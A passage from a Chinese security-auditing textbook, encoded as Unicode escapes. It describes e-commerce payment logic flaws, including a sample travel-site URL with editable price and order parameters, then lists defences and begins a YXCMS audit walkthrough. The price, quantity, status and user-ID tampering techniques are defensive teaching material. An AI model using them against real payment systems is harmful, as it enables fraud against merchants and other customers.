\u4F8B\u5982\uFF1A\u5047\u8BBE\u524D\u9762\u4E24\u6B65\u6709\u9A8C\u8BC1\u673A\u5236\uFF0C\u90A3\u4E48\u653B\u51FB\u8005\u53EF\u5728\u6700\u540E\u4E00\u6B65\uFF08\u5373\u4ED8\u6B3E\uFF09\u65F6\uFF0C\u8FDB\u884C\u6293\u5305\u5C1D\u8BD5\u4FEE\u6539\u91D1\u989D\uFF0C\u5176\u4FEE\u6539\u7684\u91D1\u989D\u503C\u53EF\u4EE5\u5C1D\u8BD5\u5C0F\u6570\u76EE\u6216\u8005\u5C1D\u8BD5\u8D1F\u6570\u3002\u56FE11-28\u4E3A\u67D0\u7F51\u7AD9\u7684\u5FAE\u4FE1\u652F\u4ED8\u6F0F\u6D1E\u6848\u4F8B\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image560.jpg)\r
\r
\u56FE11-28 \u652F\u4ED8\u6F0F\u6D1E\u6848\u4F8B\u56FE\r
\r
\u4F7F\u7528BurpSuite\u5BF9\u652F\u4ED8\u6570\u636E\u5305\u8FDB\u884C\u62E6\u622A\uFF0C\u68C0\u67E5\u652F\u4ED8\u7684\u6570\u636E\u5305\u5982\u56FE11-29\u6240\u793A\uFF0C\u5C06\u652F\u4ED8\u7684\u503C\u4ECE10\u4FEE\u6539\u4E3A0.01\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image562.jpg)\r
\r
\u56FE11-29 \u4FEE\u6539\u4EF7\u683C\u6570\u636E\u5305\u56FE\r
\r
\uFF082\uFF09   \u4FEE\u6539\u652F\u4ED8\u72B6\u6001\r
\r
\u8BE5\u6F0F\u6D1E\u53EF\u901A\u8FC7\u4FEE\u6539\u8BA2\u5355\u652F\u4ED8\u72B6\u6001\u4ECE\u800C\u8FBE\u5230\u652F\u4ED8\u529F\u80FD\u7ED5\u8FC7\u7684\u60C5\u51B5\u3002\u6B64\u7C7B\u6F0F\u6D1E\u95EE\u9898\u5728\u4E8E\u672A\u5BF9\u652F\u4ED8\u72B6\u6001\u7684\u503C\u8DDF\u5B9E\u9645\u8BA2\u5355\u652F\u4ED8\u72B6\u6001\u8FDB\u884C\u6821\u9A8C\uFF0C\u5BFC\u81F4\u70B9\u51FB\u652F\u4ED8\u65F6\u6293\u5305\u4FEE\u6539\u652F\u4ED8\u72B6\u6001\uFF0C\u4ECE\u800C\u8FBE\u5230\u652F\u4ED8\u6210\u529F\u3002\r
\r
\u4F8B\u5982\uFF1A\u67D0\u7F51\u7AD9\u4E2DA\u8BA2\u5355\u7684\u72B6\u6001\u4E3A\u201C\u5B8C\u6210\u652F\u4ED8\u201D\uFF0CB\u8BA2\u5355\u7684\u72B6\u6001\u4E3A\u201C\u672A\u5B8C\u6210\u652F\u4ED8\u201D\u3002\u4ED8\u6B3E\u65F6\u901A\u8FC7\u6293\u5305\u7684\u65B9\u5F0F\u5C06B\u8BA2\u5355\u7684\u5355\u53F7\u4FEE\u6539\u4E3A\u8BA2\u5355A\u7684\u5355\u53F7\uFF0C\u4ECE\u800C\u5C06B\u8BA2\u5355\u72B6\u6001\u4FEE\u6539\u4E3A\u201C\u5B8C\u6210\u652F\u4ED8\u201D\u3002\u4E0B\u9762\u7ED9\u51FA\u67D0\u65C5\u6E38\u7F51\u7AD9\u7684\u8BA2\u5355\u4FEE\u6539\u6848\u4F8B\uFF0C\u8BE5\u7F51\u7AD9\u901A\u8FC7\u201C\u4FEE\u6539\u8BA2\u5355\u201D\u529F\u80FD\u5C06URL\u94FE\u63A5\u8FDB\u884C\u62E6\u622A\uFF0C\u5982\u56FE11-30\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image564.jpg)\r
\r
\u56FE11-30 \u4FEE\u6539\u8BA2\u5355\u56FE\r
\r
\u5176URL\u8DEF\u5F84\u4E3A\uFF1Ahttp://ip/WDHandler/LineOrder.php?action=updateLine&PlatFORM=net&**lineid=4593689**&b2bMemberId=207967&**TotalPrice=2750.00**&TotalMan=1&TotalChild=0&b2cname=13111112343&b2......\r
\r
\u8BE5URL\u53EF\u4EE5\u5728\u4E0D\u767B\u5F55\u7684\u60C5\u51B5\u4E0B\u66F4\u65B0\u8BA2\u5355\uFF0C\u901A\u8FC7\u66F4\u6539\u4E0A\u8FF0URL\u91CC\u9762\u7684\u4E24\u4E2A\u53C2\u6570\uFF0C\u5206\u522B\u662F\uFF1Alineid\u3001totalprice\u53EF\u4EE5\u76F4\u63A5\u4FEE\u6539\u8BA2\u5355\u4EF7\u683C\uFF0C\u5982\u56FE11-31\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image566.jpg)\r
\r
\u56FE11-31 \u4FEE\u6539\u8BA2\u5355\u4EF7\u683C\u56FE\r
\r
\uFF083\uFF09   \u4FEE\u6539\u8D2D\u4E70\u6570\u91CF\r
\r
\u7F51\u7AD9\u7684\u652F\u4ED8\u8FC7\u7A0B\u4E2D\uFF0C\u901A\u8FC7\u5C06\u5546\u54C1\u7684\u6570\u91CF\u4FEE\u6539\u4E3A\u8D1F\u6570\uFF0C\u4ECE\u800C\u4FEE\u6539\u8BA2\u5355\u91D1\u989D\u4E3A\u8D1F\u6570\uFF0C\u5BFC\u81F4\u7ED5\u8FC7\u652F\u4ED8\u529F\u80FD\u3002\u8FD9\u79CD\u6848\u4F8B\u6BD4\u8F83\u5E38\u89C1\uFF0C\u4EA7\u751F\u7684\u539F\u56E0\u662F\u5F00\u53D1\u4EBA\u5458\u6CA1\u6709\u5BF9\u8D2D\u4E70\u7684\u6570\u91CF\u53C2\u6570\u8FDB\u884C\u4E25\u683C\u7684\u9650\u5236\u3002\u8FD9\u79CD\u540C\u6837\u662F\u7531\u4E8E\u6570\u91CF\u53C2\u6570\u6CA1\u6709\u505A\u7B7E\u540D\uFF0C\u5BFC\u81F4\u53EF\u968F\u610F\u4FEE\u6539\uFF0C\u5E38\u7528\u7684\u4FEE\u6539\u65B9\u5F0F\u662F\u6539\u6210\u8D1F\u6570\u3002\u5F53\u8D2D\u4E70\u7684\u6570\u91CF\u662F\u4E00\u4E2A\u8D1F\u6570\u65F6\uFF0C\u603B\u989D\u7684\u7B97\u6CD5\u4ECD\u7136\u662F"\u8D2D\u4E70\u6570\u91CFx\u5355\u4EF7=\u603B\u4EF7"\u3002\u6240\u4EE5\u8FD9\u6837\u5C31\u4F1A\u5BFC\u81F4\u8D1F\u6570\u652F\u4ED8\u91D1\u989D\u3002\u82E5\u652F\u4ED8\u6210\u529F\uFF0C\u5219\u53EF\u80FD\u5BFC\u81F4\u8D2D\u4E70\u4E86\u4E00\u4E2A\u8D1F\u6570\u6570\u91CF\u7684\u4EA7\u54C1\uFF0C\u4E5F\u6709\u53EF\u80FD\u8FD4\u8FD8\u76F8\u5E94\u7684\u79EF\u5206\u5230\u8D26\u6237\u4E0A\u3002\r
\r
\u4F8B\u5982\uFF1A\u67D0\u65C5\u6E38\u7F51\u7AD9\u7684\u4FEE\u6539\u8D2D\u4E70\u6570\u91CF\u6F0F\u6D1E\u6848\u4F8B\uFF0C\u8BE5\u7F51\u7AD9\u901A\u8FC7\u4FEE\u6539\u8BA2\u5355\u6570\u4E2D\u9884\u5B9A\u4EBA\u6570\u4E3A-1\uFF0C\u5C0F\u5B69\u4EBA\u6570\u4E3A\u6B63\u6570\u4ECE\u800C\u63D0\u4EA4\u8BA2\u5355\u6210\u529F\uFF0C\u5BFC\u81F4\u652F\u4ED8\u91D1\u989D\u5B58\u5728\u95EE\u9898\u3002\u56FE11-32\u4E3A\u8BA2\u5355\u622A\u56FE\uFF0C\u5176\u4E2D\u6210\u4EBA\u6570\u4E3A-1\uFF0C\u513F\u7AE5\u6570\u4E3A2\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image568.gif)\r
\r
\u56FE11-32\u8BA2\u5355\u622A\u56FE\r
\r
\uFF084\uFF09   \u4FEE\u6539\u9644\u5C5E\u503C\r
\r
\u5728\u8D2D\u4E70\u5546\u54C1\u65F6\u53EF\u4EE5\u4F7F\u7528\u79EF\u5206\u6216\u4F18\u60E0\u52B5\u7B49\u8FDB\u884C\u4EE3\u66FF\u91D1\u989D\u4ED8\u6B3E\uFF0C\u5F88\u591A\u7684\u5B89\u5168\u652F\u4ED8\u95EE\u9898\u90FD\u51FA\u73B0\u5728\u8BE5\u529F\u80FD\u4E0A\uFF0C\u4E00\u822C\u5C06\u6B64\u7C7B\u6F0F\u6D1E\u5F52\u7C7B\u4E3A\u901A\u8FC7\u4FEE\u6539\u9644\u5C5E\u503C\u5F15\u8D77\u7684\u5B89\u5168\u95EE\u9898\uFF0C\u5176\u4E3B\u8981\u5305\u62EC\uFF1A\r
\r
l \u4FEE\u6539\u4F18\u60E0\u52B5\u91D1\u989D\r
\r
l \u4FEE\u6539\u4F18\u60E0\u52B5\u91D1\u989D\u53CA\u4E1A\u52A1\u903B\u8F91\u95EE\u9898\r
\r
l \u4FEE\u6539\u79EF\u5206\u91D1\u989D\r
\r
\uFF085\uFF09   \u4FEE\u6539\u652F\u4ED8\u63A5\u53E3\r
\r
\u67D0\u4E9B\u7F51\u7AD9\u652F\u6301\u5F88\u591A\u79CD\u652F\u4ED8\uFF0C\u6BD4\u5982\u81EA\u5DF1\u652F\u4ED8\u5DE5\u5177\u3001\u652F\u4ED8\u5B9D\u3001\u5FAE\u4FE1\u7B49\uFF0C\u540C\u65F6\uFF0C\u6BCF\u4E2A\u652F\u4ED8\u63A5\u53E3\u503C\u90FD\u4E0D\u4E00\u6837\u3002\u5982\u679C\u8BE5\u7F51\u7AD9\u903B\u8F91\u529F\u80FD\u8BBE\u8BA1\u4E0D\u5F53\uFF0C\u5F53\u653B\u51FB\u8005\u968F\u4FBF\u9009\u62E9\u4E00\u4E2A\u63A5\u53E3\u70B9\u51FB\u652F\u4ED8\u65F6\u8FDB\u884C\u6293\u5305\uFF0C\u7136\u540E\u4FEE\u6539\u5176\u652F\u4ED8\u63A5\u53E3\u4E3A\u4E00\u4E2A\u4E0D\u5B58\u5728\u7684\u63A5\u53E3\uFF0C\u5982\u679C\u8BE5\u7F51\u7AD9\u672A\u505A\u597D\u4E0D\u5B58\u5728\u63A5\u53E3\u76F8\u5173\u5904\u7406\uFF0C\u90A3\u4E48\u6B64\u65F6\u5C31\u4F1A\u652F\u4ED8\u6210\u529F\u7684\u60C5\u51B5\u3002\r
\r
\uFF086\uFF09   \u5176\u4ED6\u652F\u4ED8\u95EE\u9898\r
\r
l \u8D8A\u6743\u652F\u4ED8\r
\r
\u5728\u652F\u4ED8\u5F53\u4E2D\u4F1A\u51FA\u73B0\u5F53\u524D\u7528\u6237\u7684ID\uFF0C\u6BD4\u5982\uFF1Ausername=XXXXX\uFF0C\u5982\u679C\u6CA1\u6709\u52A0\u4EE5\u9A8C\u8BC1\uFF0C\u5176\u652F\u4ED8\u4E5F\u662F\u4E00\u6B21\u6027\u652F\u4ED8\u6CA1\u6709\u8981\u6C42\u8F93\u5165\u5BC6\u7801\u4EC0\u4E48\u7684\u673A\u5236\uFF0C\u90A3\u4E48\u5C31\u53EF\u4EE5\u4FEE\u6539\u8FD9\u4E2A\u7528\u6237ID\u4E3A\u5176\u5B83\u7528\u6237ID\uFF0C\u8FBE\u5230\u7528\u5176\u4ED6\u7528\u6237\u7684\u8D26\u53F7\u8FDB\u884C\u652F\u4ED8\u5546\u54C1\u3002\r
\r
l \u65E0\u9650\u5236\u8BD5\u7528\r
\r
\u7F51\u7AD9\u4E2D\u7684\u4E00\u4E9B\u5546\u54C1\uFF0C\u4F8B\u5982\uFF1A\u4E91\u8BA1\u7B97\u7CFB\u5217\u4EA7\u54C1\u652F\u6301\u8BD5\u7528\uFF0C\u8BD5\u7528\u65F6\u671F\u4E00\u822C\u4E3A7\u5929\u6216\u800530\u5929\uFF0C\u4E00\u4E2A\u8D26\u6237\u53EA\u80FD\u8BD5\u7528\u4E00\u6B21\uFF0C\u8BD5\u7528\u671F\u8FC7\u540E\u5C06\u4E0D\u80FD\u7EE7\u7EED\u4F7F\u7528\u3002\u653B\u51FB\u8005\u53EF\u4EE5\u901A\u8FC7\u4FEE\u6539\u8BD5\u7528\u7684\u53C2\u6570\u4ECE\u800C\u9020\u6210\u65E0\u9650\u671F\u8BD5\u7528\u3002\r
\r
### 11.3.4 \u4EA4\u6613\u652F\u4ED8\u529F\u80FD\u9632\u5FA1\u65B9\u6CD5\r
\r
  \u4E0B\u9762\u7ED9\u51FA\u4EA4\u6613\u652F\u4ED8\u529F\u80FD\u7684\u9632\u5FA1\u65B9\u6CD5\uFF1A\r
\r
l \u540E\u7AEF\u68C0\u67E5\u6BCF\u4E00\u9879\u53C2\u6570\u503C\u3002Web\u7A0B\u5E8F\u7684\u5728\u4EA4\u6613\u6D41\u7A0B\u4E2D\uFF0C\u9700\u8981\u5BF9\u4EA4\u6613\u8FC7\u7A0B\u7684\u6BCF\u9879\u53C2\u6570\u8FDB\u884C\u68C0\u67E5\uFF0C\u5305\u62EC\uFF1A\u652F\u4ED8\u91D1\u989D\u3001\u4EA4\u6613\u6570\u91CF\u3001\u4EA4\u6613\u72B6\u6001\uFF0C\u4FDD\u8BC1\u4EA7\u54C1\u6570\u91CF\u53EA\u80FD\u4E3A\u6B63\u6574\u6570\u3001\u9650\u5236\u8D2D\u4E70\u6570\u91CF\u7B49\u3002\r
\r
l \u4E0E\u7B2C\u4E09\u65B9\u652F\u4ED8\u5E73\u53F0\u68C0\u67E5\uFF0C\u5B9E\u9645\u652F\u4ED8\u7684\u91D1\u989D\u662F\u5426\u4E0E\u8BA2\u5355\u91D1\u989D\u4E00\u81F4\u3002\r
\r
l \u652F\u4ED8\u53C2\u6570\u8FDB\u884Cmd5\u52A0\u5BC6\u3001\u89E3\u5BC6\u3001\u6570\u5B57\u7B7E\u540D\u53CA\u9A8C\u8BC1\uFF0C\u53EF\u4EE5\u6709\u6548\u7684\u907F\u514D\u6570\u636E\u4FEE\u6539\uFF0C\u91CD\u653E\u653B\u51FB\u4E2D\u7684\u5404\u79CD\u95EE\u9898\u3002\r
\r
l \u91D1\u989D\u8D85\u8FC7\u9608\u503C\uFF0C\u8FDB\u884C\u4EBA\u5DE5\u5BA1\u6838\u3002\r
\r
## 11.4 \u5355\u5143\u5C0F\u7ED3\r
\r
\u672C\u5355\u5143\u4E3B\u8981\u5B66\u4E60\u4E86\u4EE3\u7801\u5BA1\u8BA1\u4E2D\u7684\u4E1A\u52A1\u529F\u80FD\u6F0F\u6D1E\u8FDB\u884C\u5BA1\u8BA1\uFF0C\u5BF9\u4E1A\u52A1\u529F\u80FD\u6F0F\u6D1E\u4E2D\u7684\u4E3B\u8981\u529F\u80FD\uFF1A\u9A8C\u8BC1\u7801\u529F\u80FD\u3001\u5BC6\u7801\u91CD\u7F6E\u529F\u80FD\u3001\u4EA4\u6613\u652F\u4ED8\u529F\u80FD\u8FDB\u884C\u7740\u91CD\u4ECB\u7ECD\uFF0C\u4F7F\u8BFB\u8005\u719F\u6089\u5E38\u89C1\u7684\u4E1A\u52A1\u529F\u80FD\u6F0F\u6D1E\u5BA1\u8BA1\u3002\u7ED9\u51FAnbcms\u4E0Ededecms\u5B58\u5728\u7684\u4E1A\u52A1\u529F\u80FD\u6F0F\u6D1E\u8FDB\u884C\u5B9E\u8DF5\uFF0C\u4ECE\u800C\u5BF9\u672C\u5355\u5143\u5185\u5BB9\u8FDB\u4E00\u6B65\u7406\u89E3\u3002\r
\r
\r
\r
 \r
\r
# \u5355\u514312 YXCMS\u5BA1\u8BA1\r
\r
\u672C\u5355\u5143\u5C06\u5BF9\u4E00\u4E2ACMS\u7CFB\u7EDF\u8FDB\u884C\u8F83\u4E3A\u5B8C\u6574\u7684\u5BA1\u8BA1\uFF0C\u5176\u5206\u4E3A\u56DB\u90E8\u5206\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
\u7B2C\u4E00\u90E8\u5206\u4ECB\u7ECDCMS\u5BA1\u8BA1\u7684\u51C6\u5907\u5DE5\u4F5C\uFF1A\u9875\u9762\u529F\u80FD\u5206\u6790\u3001CMS\u76EE\u5F55\u7ED3\u6784\u5206\u6790\u3001\u8DEF\u7531\u60C5\u51B5\u5206\u6790\u3001\u8FC7\u6EE4\u51FD\u6570\u4E86\u89E3\u3002\u53EA\u6709\u5BF9\u8FD9\u4E0A\u8FF0\u5DE5\u4F5C\u51C6\u5907\u5145\u5206\u624D\u80FD\u66F4\u719F\u7EC3\u7684\u5206\u6790CMS\r
\r
\u7B2C\u4E8C\u90E8\u5206\u4ECB\u7ECDYXCMS\u4E2D\u7559\u8A00\u677F\u529F\u80FD\u4E2D\u5B58\u5728\u7684\u5B58\u50A8\u578BXSS\u6F0F\u6D1E\u7684\u5206\u6790\u5229\u7528\u3002\r
\r
\u7B2C\u4E09\u90E8\u5206\u4ECB\u7ECDYXCMS\u4E2D\u788E\u7247\u7BA1\u7406\u529F\u80FD\u4E2D\u5B58\u5728\u7684SQL\u6CE8\u5165\u6F0F\u6D1E\u7684\u5206\u6790\u5229\u7528\u3002\r
\r
\u7B2C\u56DB\u90E8\u5206\u4ECB\u7ECDYXCMS\u4E2D\u5B58\u5728\u7684\u4EFB\u610F\u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\u5206\u6790\u4E0E\u5229\u7528\u3002\r
\r
**\u5355\u5143\u6784\u56FE\uFF1A**\r
\r
**![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image570.jpg)**\r
\r
**\u5355\u5143\u76EE\u6807\uFF1A**\r
\r
\\1.  \u4E86\u89E3CMS\u5B8C\u6574\u7684\u5BA1\u8BA1\u6D41\u7A0B\uFF1B\r
\r
\\2.  \u638C\u63E1CMS\u5BA1\u8BA1\u7684\u51C6\u5907\u5DE5\u4F5C\uFF1B\r
\r
\\3.  \u719F\u6089\u5E38\u89C1\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\u3002\r
\r
## 12.1  \u5BA1\u8BA1\u524D\u51C6\u5907\r
\r
\u5728\u5BF9CMS\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u524D\uFF0C\u901A\u5E38\u9700\u8981\u4F7F\u7528\u901A\u8BFB\u5168\u6587\u6CD5\u5BF9CMS\u7684\u6574\u4F53\u6846\u67B6\u6709\u6240\u4E86\u89E3\u3002\u5BA1\u8BA1\u7684\u51C6\u5907\u516C\u7956\u54E6\u5305\u62EC\uFF1A\u9875\u9762\u529F\u80FD\u5206\u6790\u3001\u76EE\u5F55\u7ED3\u6784\u5206\u6790\u3001\u8DEF\u7531\u60C5\u51B5\u5206\u6790\u3001\u8FC7\u6EE4\u51FD\u6570\u5165\u53E3\u51FD\u6570\u5206\u6790\u3002\r
\r
1.\u524D\u53F0\u9875\u9762\u529F\u80FD\u8FDB\u884C\u5206\u6790\r
\r
\u642D\u5EFA\u7F51\u7AD9\u7ED3\u675F\u540E\uFF0C\u7528\u6237\u53EF\u8BBF\u95EE\u524D\u53F0\u9875\u9762\u5BF9\u8BE5CMS\u7684\u529F\u80FD\u8FDB\u884C\u4E86\u89E3\uFF0C\u9875\u9762\u5982\u56FE12-1\u6240\u793A\u3002\u9488\u5BF9\u4E0D\u540C\u7684\u529F\u80FD\u70B9\u63A8\u6D4B\u53EF\u80FD\u5B58\u5728\u5B89\u5168\u6F0F\u6D1E\u7684\u529F\u80FD\u70B9\u3002\r
\r
\u4E0B\u9762\u5BF9\u8BE5\u9875\u9762\u5B89\u5168\u95EE\u9898\u8FDB\u884C\u5217\u4E3E\uFF1A\r
\r
l \u7528\u6237\u6CE8\u518C\u529F\u80FD\u3001\u7528\u6237\u767B\u5F55\u529F\u80FD\uFF1A\u662F\u5426\u5B58\u5728SQL\u6CE8\u5165\u6F0F\u6D1E\u3002\r
\r
l \u7528\u6237\u5FD8\u8BB0\u5BC6\u7801\u529F\u80FD\uFF1A\u662F\u5426\u5B58\u5728\u4E1A\u52A1\u903B\u8F91\u529F\u80FD\u6F0F\u6D1E\u3002\r
\r
l \u7559\u8A00\u672C\u529F\u80FD\uFF1A\u662F\u5426\u5B58\u5728\u5B58\u50A8\u578BXSS\u6F0F\u6D1E\u6216SQL\u6CE8\u5165\u3002\r
\r
l \u641C\u7D22\u6846\u529F\u80FD\uFF1A\u662F\u5426\u5B58\u5728\u53CD\u5C04\u578BXSS\u6F0F\u6D1E\u6216SQL\u6CE8\u5165\u3002\r
\r
l \u70B9\u51FB\u6A21\u677F\u529F\u80FD\uFF1A\u8BF7\u6C42\u94FE\u63A5\u53EF\u80FD\u5B58\u5728SQL\u6CE8\u5165\uFF0C\u94FE\u63A5\u5982\u4E0B\uFF1A\r
\r
http://ip/index.php?r=default/column/content&col=demoshow&id=6\r
\r
l \u652F\u4ED8\u529F\u80FD\uFF1A\u662F\u5426\u5B58\u5728\u652F\u4ED8\u903B\u8F91\u6F0F\u6D1E\u3002\r
\r
\u4E00\u822C\u60C5\u51B5\u4E0B\uFF0C\u529F\u80FD\u70B9\u8D8A\u591A\u5B58\u5728\u7684\u6F0F\u6D1E\u53EF\u80FD\u6027\u8D8A\u5927\uFF0C\u4ECE\u524D\u53F0\u529F\u80FD\u5BA1\u8BA1\u53EA\u80FD\u5BF9\u57FA\u672C\u6F0F\u6D1E\u8FDB\u884C\u63A8\u6D4B\uFF0C\u800C\u5B9E\u9645\u5206\u6790\u4ECD\u9700\u8981\u9ED1\u76D2\u4E0E\u767D\u76D2\u76F8\u7ED3\u5408\u624D\u80FD\u80FD\u5FEB\u901F\u7684\u6316\u6398\u6F0F\u6D1E\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image572.jpg)\r
\r
\u56FE12-1 YXCMS\u524D\u53F0\u9875\u9762\u56FE\r
\r
2\uFF0E\u540E\u53F0\u9875\u9762\u529F\u80FD\u8FDB\u884C\u5206\u6790\r
\r
\u7531\u4E8E\u8BE5CMS\u5B58\u5728\u540E\u53F0\u7BA1\u7406\u5458\u7A0B\u5E8F\uFF0C\u56E0\u6B64\u8FD8\u9700\u8981\u5BF9\u8BE5\u9875\u9762\u529F\u80FD\u8FDB\u884C\u5B89\u5168\u6F0F\u6D1E\u5206\u6790\uFF0C\u9875\u9762\u5982\u56FE12-2\u6240\u793A\u3002\u5728\u5F88\u591ACMS\u4E2D\u7531\u4E8E\u7BA1\u7406\u5458\u529F\u80FD\u8F83\u591A\u3001\u6743\u9650\u8F83\u9AD8\uFF0C\u5BFC\u81F4\u5176\u5B89\u5168\u6F0F\u6D1E\u4E5F\u76F8\u8F83\u4E8E\u524D\u53F0\u9875\u9762\u66F4\u591A\uFF0C\u4E0B\u9762\u5BF9\u5176\u53EF\u80FD\u5B58\u5728\u5B89\u5168\u6F0F\u6D1E\u7684\u529F\u80FD\u8FDB\u884C\u5217\u4E3E\uFF1A\r
\r
l \u540E\u53F0\u586B\u5199\u7684\u6240\u6709\u8868\u5355\uFF1A\u5747\u6709\u53EF\u80FD\u5B58\u5728XSS\u6F0F\u6D1E\u3002\r
\r
l SQL\u6267\u884C\u529F\u80FD\u3001\u6570\u636E\u5E93\u5907\u4EFD\uFF1A\u53EF\u80FD\u5B58\u5728\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u3002\r
\r
l \u6A21\u677F\u7BA1\u7406\u529F\u80FD\uFF1A\u53EF\u80FD\u5B58\u5728\u4EFB\u610F\u6587\u4EF6\u5220\u9664\u3001\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u3002\r
\r
\u5176\u4ED6\u6F0F\u6D1E\u5305\u62EC\uFF1ASSRF\u3001XXE\u3001\u6587\u4EF6\u5305\u542B\u3001\u53CD\u5E8F\u5217\u5316\u7B49\u6F0F\u6D1E\u65E0\u6CD5\u4ECE\u9875\u9762\u529F\u80FD\u53D1\u73B0\u63A8\u6D4B\u3002\u9700\u8981\u5BF9\u540E\u53F0\u4EE3\u7801\u8FDB\u884C\u5168\u5C40\u641C\u7D22\u5371\u9669\u51FD\u6570\uFF0C\u6216\u4F7F\u7528\u5BA1\u8BA1\u5DE5\u5177\u626B\u63CF\u5206\u6790\u6F0F\u6D1E\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image574.jpg)\r
\r
\u56FE12-2 YXCMS\u540E\u53F0\u9875\u9762\u56FE\r
\r
  3.CMS\u76EE\u5F55\u7ED3\u6784\u5206\u6790\r
\r
\u7ECF\u8FC7\u5206\u6790\u53EF\u77E5YXCMS\u76EE\u5F55\u7ED3\u6784\u5982\u886812-1\u6240\u793A\u3002\r
\r
\u886812-1 YXCMS\u6587\u4EF6\u76EE\u5F55\u7ED3\u6784\r
\r
| **\u6587\u4EF6\u540D**   | **\u6587\u4EF6\u4F5C\u7528**     | **\u6587\u4EF6\u5C5E\u6027**    | **\u6587\u4EF6\u4F5C\u7528**       |\r
| ------------ | ---------------- | --------------- | ------------------ |\r
| data\u6587\u4EF6\u5939   | \u5B58\u653E\u5907\u4EFD\u6570\u636E     | protected\u6587\u4EF6\u5939 | \u7F51\u7AD9\u7A0B\u5E8F\u6838\u5FC3\u6587\u4EF6\u5939 |\r
| public\u6587\u4EF6\u5939 | \u5B58\u653E\u6A21\u677F\u516C\u7528\u6587\u4EF6 | upload\u6587\u4EF6\u5939    | \u5B58\u653E\u4E0A\u4F20\u6587\u4EF6       |\r
| index.php    | \u7F51\u7AD9\u5165\u53E3\u6587\u4EF6     |                 |                    |\r
\r
\u9700\u8981\u5BF9proctected\u6587\u4EF6\u5939\u4E0B\u7684\u7ED3\u6784\u8FDB\u884C\u5206\u6790\uFF0C\u5176\u7ED3\u6784\u5982\u886812-2\u6240\u793A\u3002\r
\r
\u886812-2 proctected\u6587\u4EF6\u76EE\u5F55\u7ED3\u6784\r
\r
| **\u6587\u4EF6\u540D**                        | **\u6587\u4EF6\u4F5C\u7528**     |\r
| --------------------------------- | ---------------- |\r
| protected/apps/admin              | \u7BA1\u7406\u5458\u540E\u53F0\u5E94\u7528   |\r
| protected/apps/default            | \u524D\u53F0\u529F\u80FD\u5E94\u7528     |\r
| protected/apps/member             | \u4F1A\u5458\u4E2D\u5FC3\u5165\u53E3\u6587\u4EF6 |\r
| protected/apps/install            | \u7CFB\u7EDF\u5B89\u88C5         |\r
| protected/apps/appmanage          | \u5E94\u7528\u7BA1\u7406         |\r
| protected/apps/default/controller | \u63A7\u5236\u5668           |\r
| protected/apps/default/model      | \u6A21\u578B             |\r
| protected/apps/default/view       | \u754C\u9762             |\r
| protected/config.php              | \u7CFB\u7EDF\u5168\u5C40\u914D\u7F6E     |\r
| protected/core.php                | \u7CFB\u7EDF\u6838\u5FC3\u51FD\u6570     |\r
\r
\u81F3\u6B64\uFF0C\u5206\u6790\u8BE5CMS\u7684\u529F\u80FD\u4E3B\u8981\u5305\u62EC\uFF1A\u7BA1\u7406\u5458\u3001\u524D\u53F0\u3001\u4F1A\u5458\u4E2D\u5FC3\u3001\u5E94\u7528\u7BA1\u7406\u7B49\u529F\u80FD\uFF0C\u6BCF\u4E2A\u529F\u80FD\u5206\u522B\u5BF9\u5E94protected/apps\u4E0B\u7684\u4E00\u4E2A\u6587\u4EF6\u5939\u3002\u540C\u65F6\uFF0C\u6BCF\u4E2A\u529F\u80FD\u6587\u4EF6\u5939\u4E0B\u90FD\u5305\u542B\uFF1A\u63A7\u5236\u5C42\uFF08controller\uFF09\u3001\u6A21\u578B\u5C42\uFF08model\uFF09\u3001\u754C\u9762\u5C42\uFF08view\uFF09\u3002\u4E0A\u8FF0\u4E09\u5C42\u662FWeb\u5E94\u7528\u5F00\u53D1\u4E2D\u5E38\u7528\u7684\u7ED3\u6784\uFF08MVC\u6A21\u578B\u7ED3\u6784\uFF09\u3002\r
\r
MVC\u6A21\u578B\u7ED3\u6784\u5206\u522B\u63A7\u5236\u7740\u7F51\u7AD9\u7684\u5E94\u7528\u529F\u80FD\uFF0C\u5176\u5305\u62EC\uFF1AModel\u3001Controller\u3001View\u3002\r
\r
l Model\uFF08\u6A21\u578B\uFF09\uFF1A\u6A21\u578B\u5C42\uFF0C\u5B9A\u4E49\u8BE5\u5E94\u7528\u4E2D\u7684\u7C7B\u6587\u4EF6\u3002\r
\r
l Controller\uFF08\u63A7\u5236\uFF09\uFF1A\u63A7\u5236\u5C42\uFF0C\u8D1F\u8D23\u4E1A\u52A1\u903B\u8F91\u5E76\u628A\u9875\u9762\u5C55\u793A\u7ED9\u7528\u6237\uFF1B\r
\r
l View\uFF08\u89C6\u56FE\uFF09\uFF1A\u89C6\u56FE\u5C42\uFF0C\u8D1F\u8D23\u5728\u9002\u5F53\u7684\u65F6\u5019\u8C03\u7528Model\u548CController\uFF1B\r
\r
4.\u8DEF\u7531\u60C5\u51B5\u5206\u6790\r
\r
